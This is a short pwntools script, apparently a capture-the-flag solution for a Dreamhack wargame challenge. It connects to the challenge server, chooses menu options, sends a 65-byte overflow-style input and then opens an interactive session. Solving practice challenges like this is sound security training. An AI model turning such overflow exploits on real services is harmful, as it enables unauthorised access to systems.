#!/usr/bin/python3

from pwn import *

p = remote('host3.dreamhack.games', 10049)
p.sendlineafter(b'input : ',b'1')
p.sendlineafter(b'input : ',b'2')
p.sendlineafter(b' : ',b'a'*65)
p.sendlineafter(b'input : ',b'3')

p.interactive()
